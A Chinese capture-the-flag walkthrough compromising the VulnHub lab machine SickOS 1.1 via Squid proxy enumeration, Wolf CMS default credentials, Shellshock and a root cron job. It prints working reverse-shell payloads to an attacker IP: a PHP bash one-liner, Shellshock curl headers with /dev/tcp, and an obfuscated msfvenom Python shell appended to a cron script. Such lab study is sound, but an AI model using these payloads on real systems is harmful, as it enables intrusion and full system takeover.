> 文档 说明：https://www.vulnhub.com/entry/sickos-11,132/
>
> **Download (Mirror)**: https://download.vulnhub.com/sickos/sick0s1.1.7z

# nmap信息收集

### 主机发现

![image-20231210120640060](./SickOS1.1.assets/image-20231210120640060.png)

### 端口扫描

```bash
 sudo nmap --min-rate 10000 -p- 10.9.75.14  
```



![image-20231210120746386](./SickOS1.1.assets/image-20231210120746386.png)

详细端口扫描

```bash
sudo nmap -sT -sV -O -sC  -p22,3128,8080  10.9.75.14
```



![image-20231210120946897](./SickOS1.1.assets/image-20231210120946897.png)

udp扫描

```bash
sudo nmap -sU -p22,3128,8080 10.9.75.14
```

![image-20231210121008654](./SickOS1.1.assets/image-20231210121008654.png)

指定漏洞脚本扫描

```bash
sudo nmap --script=vuln  -p22,3128,8080  10.9.75.14
```

![image-20231210121156619](./SickOS1.1.assets/image-20231210121156619.png)

根据上面扫出来的结果 ，发现使用了代理服务，

`8080是http-proxy，关闭状态`

`3128是squid-http，开放状态`

根据百度返回的结果，知道`squid`也是一个代理服务器

![image-20231210122914418](./SickOS1.1.assets/image-20231210122914418.png)

> Squid代理服务器是基于[Unix](https://baike.baidu.com/item/Unix/219943?fromModule=lemma_inlink)的代理服务器（proxy server），它缓存比起点源点更接近请求者的互联网内容。Squid支持缓存多种不同的网络对象，包括那些通过HTTP 和 FTP访问的人。

先尝试访问一下吧

![image-20231210123235270](./SickOS1.1.assets/image-20231210123235270.png)

访问3128端口，返回一个错误页面

### 目录扫描

![image-20231210123931150](./SickOS1.1.assets/image-20231210123931150.png)

但是都没有得到正常的输出

这里需要使用代理去爆破目录

```bash
dirsearch -u http://10.9.75.14  -i 200 --proxy=http://10.9.75.14:3128
dirb http://10.9.75.14 -p http://10.9.75.14:3128
```

![image-20231210124140281](./SickOS1.1.assets/image-20231210124140281.png)

既然目录扫描使用到了代理，那么浏览器访问也需要使用代理

![image-20231210124438774](./SickOS1.1.assets/image-20231210124438774.png)

浏览器直接访问靶机地址

![image-20231210124452688](./SickOS1.1.assets/image-20231210124452688.png)

# 渗透方式一:Squid代理



访问`robots.txt`

![image-20231210124618898](./SickOS1.1.assets/image-20231210124618898.png)

有一个wolfcms目录

在`Articles`界面发现有类似于文章的东西

![image-20231210130110046](./SickOS1.1.assets/image-20231210130110046.png)

### 查找cms默认信息

有Posted by Administrator 的字样，可以在网上找管理员的路径

google浏览器搜索：wolfcms admin path

![image-20231210130007224](./SickOS1.1.assets/image-20231210130007224.png)

访问：10.9.75.14/wolfcms/?admin，跳转到一个登陆界面

![image-20231210130203675](./SickOS1.1.assets/image-20231210130203675.png)

可以去网上找找这个cms，有没有默认的用户名密码，或者直接尝试一些弱口令试一试

输入`admin:admin`登陆成功

![image-20231210130454402](./SickOS1.1.assets/image-20231210130454402.png)

发现这个都有php的代码，可以写一句话反弹

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.75.3/6868 0>&1'"); ?>
```

![image-20231210130859699](./SickOS1.1.assets/image-20231210130859699.png)



### GetShell

kali这边写开启监听

回到http://10.9.75.14/wolfcms/这个界面，点击`Articles`触发反弹shell

![image-20231210131020077](./SickOS1.1.assets/image-20231210131020077.png)

![image-20231210131050802](./SickOS1.1.assets/image-20231210131050802.png)

在当前路径下有一个`config.php`文件

![image-20231210131214621](./SickOS1.1.assets/image-20231210131214621.png)

可以看到数据库的用户名是` root `，密码是` john@123 `。

通过` cat /etc/passwd` 查看到当前系统有 bash 交互环境的用户只有 root 和 sickos

![image-20231210131659908](./SickOS1.1.assets/image-20231210131659908.png)

由于 22 端口是开放的，所以我们可以通过 ssh 连接至这台机器，那么猜测一下，这个数据库的密码会不会和这个系统用户的密码相同呢？

### 尝试SSH连接

使用`sickos:john@123`连接SSH成功

![image-20231210131810656](./SickOS1.1.assets/image-20231210131810656.png)

查看有哪些能够以root身份执行的

![image-20231210131916310](./SickOS1.1.assets/image-20231210131916310.png)

发现有所有的权限

那么就可以直接拿到root

![image-20231210132003903](./SickOS1.1.assets/image-20231210132003903.png)

# 渗透方式二:ShellShock漏洞

## nikto漏洞扫描

用nikto对靶机进行扫描。nikto是一个用于网页服务器漏洞扫描的工具，是kali中自带的

```bash
nikto -h 10.9.75.14 -useproxy http://10.9.75.14:3128 
```



![image-20231210142744246](./SickOS1.1.assets/image-20231210142744246.png)

扫描结果发现在路径/cgi-bin/status目录下存在shellshock漏洞。shellshock是一个有关bash的漏洞，也称为Bashdoor

尝试用curl发送请求进行验证

```bash
curl -v --proxy http://10.9.75.14:3128 http://10.9.75.14/cgi-bin/status -H "Referer:() {  test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"
```

> - `curl`: Curl是一个命令行工具，用于发送HTTP请求和获取相应的数据。
> - `-v`: 这个选项表示在执行请求时显示详细的输出，包括请求头和响应信息。
> - `--proxy http://10.9.75.14:3128`: 这个选项指定了使用代理服务器进行请求。代理服务器的地址是10.9.75.14，端口是3128。这是为了通过代理服务器发起请求，可能是为了绕过某些防火墙或进行中间人攻击。
> - `http://10.9.75.14/cgi-bin/status`: 这是要请求的URL地址。10.9.75.14是目标服务器的IP地址，/cgi-bin/status是目标服务器上的一个CGI脚本路径。
> - `-H "Referer:() { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"`: 这个选项指定了一个自定义的请求头"Referer"。Shellshock漏洞可以通过构造恶意的Referer头来执行任意命令。在这个例子中，构造的Referer头包含了一段Shellshock的Payload，以执行/usr/bin/id命令并打印当前用户的身份信息

![image-20231210143314347](./SickOS1.1.assets/image-20231210143314347.png)

## msfvenom反弹 shell

用msfvenom生成反弹shell到kali的6868端口的命令。Kali中的msfvenom取代了msfpayload和msfencode，**常用于生成后门木马**。生成bash反弹shell命令的如下

```bash
sudo msfvenom -p cmd/unix/reverse_bash lhost=10.9.75.3 lport=6868 -f raw
```

> -p表示指定需要使用的payload(攻击荷载)，这里使用反弹的bash的shell，即reverse_bash
>
> -f 指定输出格式，这里使用源码格式raw。
>
> lhost和lport表示反弹shell的ip和端口，此处是kali的ip和一会开启nc监听的6868端口。

![image-20231210144254579](./SickOS1.1.assets/image-20231210144254579.png)

> Payload:`0<&185-;exec 185<>/dev/tcp/10.9.75.3/6868;sh <&185 >&185 2>&185`

payload一会要放入curl构造的payload命令中。先在kali中开启监听6868端口

## GetShell

然后使用curl命令执行payload

```bash
curl -v --proxy http://10.9.75.14:3128 http://10.9.75.14/cgi-bin/status -H "Referer:() {  test;}; 0<&185-;exec 185<>/dev/tcp/10.9.75.3/6868;sh <&185 >&185 2>&185"
```

![image-20231210144700255](./SickOS1.1.assets/image-20231210144700255.png)

监听的端口并没有收到反弹shell，显示没有对应的目录，因此要把命令中的sh写为完整路径/bin/bash，我们先重启一个监听：

![image-20231210144828892](./SickOS1.1.assets/image-20231210144828892.png)

接下来另一个终端重新构造curl命令，将sh改为/bin/bash，完整的命令如下：

```
curl -v --proxy http://10.9.75.14:3128 http://10.9.75.14/cgi-bin/status -H "Referer:() {  test;}; 0<&185-;exec 185<>/dev/tcp/10.9.75.3/6868;/bin/sh <&185 >&185 2>&185"
```

![image-20231210145012780](./SickOS1.1.assets/image-20231210145012780.png)

好像反弹成功了，但是好像没有回想

![image-20231210145042909](./SickOS1.1.assets/image-20231210145042909.png)

我们先用`dpkg –l`看一看有没有安装`python`，试图使用`python`获得交互性更好的shell

![image-20231210145259818](./SickOS1.1.assets/image-20231210145259818.png)

发现是有python环境的，用python获取交互性更好的shell

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20231210145402119](./SickOS1.1.assets/image-20231210145402119.png)

## crontab提权

已经拿到了www-data的shell，接下来就是想办法提权为root。我们只能先在www-data的shell中看看有哪些信息可以利用。www-data一般是网站的权限，先看看网站跟目录/var/www/中有什么吧。

![image-20231210151141807](./SickOS1.1.assets/image-20231210151141807.png)

当`cat connect.py`时 看到 "I Try to connect things very frequently" “很规律的去连接一些事情，你可以尝试我的服务” ，也就是说明应该有一个定时任务

```bash
cat etc/crontab        #常用，没有的话看看第二个命令
cat etc/cron.d         #cron.d 是/etc下的目录，重点进去是否有计划任务文件
```

![image-20231210151304209](./SickOS1.1.assets/image-20231210151304209.png)

会以root身份每分钟执行connect.py文件，这个connect.py就是我们刚刚给我们提示的文件，因此我们想到了提权的方法，在connect.py文件中添加payload反弹shell，因为会定期执行，我们只要等待定时任务执行即可。那么，就需要生成python中的反弹shell的payload，还是用msfvenom，这回-p指定获取python的反弹shell，命令如下（反弹到6869端口）：

```bash
msfvenom -p cmd/unix/reverse_python lhost=10.9.75.3 lport=6869 -f raw
```

![image-20231210151531828](./SickOS1.1.assets/image-20231210151531828.png)

> payload如下：
>
> `exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFT8sKwjAQ/JWSUwKSPsRqkRyKVBBRwfZebIy0WLOhm/6/xAQ8di/DPHaHHT4GJhshyLeykZsVzp2ZQCpEz+GH+6gHtIKkCS/4dsPXxKtuXeS7vPAUhT/FPdDAymN7ulZNKPBafTuc27q5V+WFhWUuQWslLaWuzKddAQsBQP6cTUaRv4ZRaaDMZ5IFP13ws+Ab8X+ey8c4UhJ3g46xJ+wLkl1TyA==')[0])))`

 回到www-data的shell中，在/var/www/connect.py文件中添加msfvenom生成的payload。由于这个shell交互性还是差，vi或vim工具太难用了，因此我直接追加命令到connect.py，运行命令的目录是/var/www

```bash
echo "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFT8sKwjAQ/JWSUwKSPsRqkRyKVBBRwfZebIy0WLOhm/6/xAQ8di/DPHaHHT4GJhshyLeykZsVzp2ZQCpEz+GH+6gHtIKkCS/4dsPXxKtuXeS7vPAUhT/FPdDAymN7ulZNKPBafTuc27q5V+WFhWUuQWslLaWuzKddAQsBQP6cTUaRv4ZRaaDMZ5IFP13ws+Ab8X+ey8c4UhJ3g46xJ+wLkl1TyA==')[0])))">>connect.py
```



![image-20231210151703530](./SickOS1.1.assets/image-20231210151703530.png)

kali开启监听6869端口

成功拿到root

![image-20231210151928913](./SickOS1.1.assets/image-20231210151928913.png)